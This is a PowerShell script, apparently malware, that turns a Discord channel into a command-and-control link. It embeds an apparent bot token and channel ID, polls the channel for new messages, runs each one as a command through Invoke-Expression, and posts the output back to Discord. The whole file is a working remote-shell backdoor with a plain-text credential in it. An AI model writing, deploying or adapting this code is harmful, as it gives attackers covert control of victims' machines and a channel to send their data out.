$t = "MTM2MzI0OTY0MDg1MzQ3NTQyMA.GZTP1F.ahKaK-i9T3W9SBpqilUKOTbeehkFQcewTYy8kc"
$c = "1383138417348575272"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

function Send-DiscordMessage {
    $url = "https://discord.com/api/v10/channels/$c/messages"
    $body = @{ content = "```$($args[0])```" } | ConvertTo-Json -Depth 3
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $t")
    $wc.Headers.Add("Content-Type", "application/json")
    $wc.UploadString($url, "POST", $body)
}

while ($true) {
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $t")
    $cmds = $wc.DownloadString("https://discord.com/api/v10/channels/$c/messages") | ConvertFrom-Json
    $latest = $cmds | Where-Object { -not $_.author.bot } | Select-Object -First 1
    if ($latest) {
        $out = Invoke-Expression $latest.content 2>&1
        Send-DiscordMessage $out
    }
    Start-Sleep -Seconds 5
}
